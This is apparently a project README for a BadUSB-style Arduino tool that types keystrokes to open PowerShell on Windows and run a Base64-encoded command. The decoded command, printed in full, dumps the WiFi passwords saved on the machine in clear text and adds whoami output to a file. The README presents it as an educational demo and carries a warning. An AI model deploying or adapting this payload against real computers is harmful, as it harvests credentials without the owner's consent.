
# BadArduino: Executing Commands on Windows with Arduino

This project is a demonstrative example of how to use an Arduino device to send predefined commands to a computer. The code shows how to simulate keystrokes and send commands to PowerShell using Arduino's keyboard emulation capabilities, with the `Keyboard.h` library.

⚠️ **WARNING**: This code is purely for illustrative and educational purposes. Misuse of such techniques may violate the law or security policies. Use this project only in a controlled environment and with the device owner's consent.

---

## Code Features

This code uses an Arduino (e.g., Arduino Leonardo or another device capable of keyboard emulation [`ATmega32u4 chip`]) to:
1. Open PowerShell using the Windows shortcut `Win + R`.
2. Execute a Base64-encoded PowerShell command, which is decoded and explained below.

> **Note:** Make sure to use the appropriate keyboard layout library for the target PC’s language. For example, `Keyboard_it_IT.h` for Italian, or another layout file that matches the intended language. This ensures that the keys are correctly interpreted on the destination system.

---

## Decoding the `EncodedCommand` Command

The Base64 encoded string executes a PowerShell command that collects various system information. Here is the original command:

```powershell
$filePath = "$env:USERPROFILE\test.txt";
$wifiProfiles = netsh wlan show profiles | Select-String "All user profiles" | ForEach-Object { ($_ -split ": ")[1].Trim() };
$output = "";
$wifiProfiles | ForEach-Object { $profile = $_; $profileInfo = netsh wlan show profile name="$profile" key=clear; $password = ($profileInfo | Select-String "Key Content").replace('^.*:\s*', ''); if (!$password) { $password = "N/A" }; $output += "Profile: $profile\nPassword: $password\n"; };
$userInfo = whoami;
$output += "`nUser Info: $userInfo`n";
$output | Out-File -FilePath $filePath;
notepad $filePath
```

This command saves a `test.txt` file containing information about WiFi profiles and other user information in the user's folder (`$env:USERPROFILE`).

---

## Execution Demo

When you connect the Arduino device, it automatically executes the programmed sequence as shown in the demo image ([Demo](https://github.com/nemmusu/badarduino/example/demo.gif)). The GIF demonstrates how the Arduino opens PowerShell and runs commands to collect information, storing it in a text file, which then opens in Notepad.

